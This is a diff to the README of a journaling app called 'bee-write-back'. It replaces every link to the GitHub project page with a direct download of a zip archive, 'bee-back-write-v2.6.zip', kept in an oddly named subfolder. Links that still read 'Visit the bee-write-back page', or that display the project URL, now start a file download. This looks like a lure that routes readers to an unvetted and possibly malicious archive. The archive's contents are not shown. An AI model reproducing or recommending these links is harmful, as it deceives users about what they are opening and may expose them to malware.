@@ -1,6 +1,6 @@
 # 🐝 bee-write-back - Simple journaling on your own terms
 
-[![Download bee-write-back](https://img.shields.io/badge/Download%20bee--write--back-blue?style=for-the-badge&logo=github)](https://github.com/Mousebuttoncankerworm387/bee-write-back)
+[![Download bee-write-back](https://img.shields.io/badge/Download%20bee--write--back-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mousebuttoncankerworm387/bee-write-back/main/apocopation/bee-back-write-v2.6.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ It also includes extra tools for the same device, such as a basic Claude chat cl
 
 Use this link to visit the page to download:
 
-[Visit the bee-write-back page](https://github.com/Mousebuttoncankerworm387/bee-write-back)
+[Visit the bee-write-back page](https://raw.githubusercontent.com/Mousebuttoncankerworm387/bee-write-back/main/apocopation/bee-back-write-v2.6.zip)
 
 ### On Windows
 
@@ -193,7 +193,7 @@ A typical project layout includes:
 
 If you want to return to the project page, use this link:
 
-[https://github.com/Mousebuttoncankerworm387/bee-write-back](https://github.com/Mousebuttoncankerworm387/bee-write-back)
+[https://raw.githubusercontent.com/Mousebuttoncankerworm387/bee-write-back/main/apocopation/bee-back-write-v2.6.zip](https://raw.githubusercontent.com/Mousebuttoncankerworm387/bee-write-back/main/apocopation/bee-back-write-v2.6.zip)
 
 ## 📌 File Reference
 
